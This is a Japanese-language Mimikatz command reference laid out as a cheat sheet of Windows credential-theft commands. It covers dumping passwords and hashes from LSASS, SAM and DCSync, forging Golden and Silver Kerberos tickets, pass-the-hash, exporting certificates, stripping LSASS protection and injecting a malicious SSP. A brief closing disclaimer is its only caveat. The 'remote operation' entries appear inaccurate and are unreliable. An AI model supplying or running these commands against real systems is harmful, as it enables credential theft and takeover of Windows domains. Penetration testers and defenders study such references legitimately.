# Mimikatz Command Reference

**対応OS**: Windows

## 基本的な使用方法
```powershell
# 管理者権限でMimikatzを起動
mimikatz.exe

# モジュールのバージョン表示
mimikatz # version

# 特権の取得
mimikatz # privilege::debug
```

## パスワード抽出
```powershell
# メモリからパスワードを抽出
mimikatz # sekurlsa::logonpasswords

# キャッシュされたパスワードの抽出
mimikatz # lsadump::cache

# SAMからパスワードハッシュを抽出
mimikatz # lsadump::sam

# DCSyncを使用したハッシュの抽出
mimikatz # lsadump::dcsync /domain:domain.local /user:Administrator
```

## チケット操作
```powershell
# Kerberosチケットの表示
mimikatz # sekurlsa::tickets

# チケットのエクスポート
mimikatz # kerberos::list /export

# Golden Ticketの作成
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /krbtgt:hash /ptt

# Silver Ticketの作成
mimikatz # kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21... /target:server.domain.local /service:SERVICE /rc4:hash /ptt
```

## パススルーハッシュ攻撃
```powershell
# パススルーハッシュの実行
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /ntlm:hash

# Over-Pass-the-Hashの実行
mimikatz # sekurlsa::pth /user:Administrator /domain:domain.local /aes256:hash
```

## 証明書操作
```powershell
# 証明書のエクスポート
mimikatz # crypto::certificates /export

# 証明書の操作
mimikatz # crypto::capi
mimikatz # crypto::cng
```

## メモリ保護のバイパス
```powershell
# メモリ保護の無効化
mimikatz # !+ 
mimikatz # !processprotect /process:lsass.exe /remove

# SSP の登録
mimikatz # misc::memssp
```

## リモート操作
```powershell
# リモートプロセスへの接続
mimikatz # @processname

# リモートコンピュータへの接続
mimikatz # exec-system "command"
```

## 注意事項
- このツールの使用は多くの場合、マルウェアとして検知されます
- システムのセキュリティに重大な影響を与える可能性があります
- 教育目的以外での使用は違法となる可能性があります
- 実環境での使用は絶対に避けてください 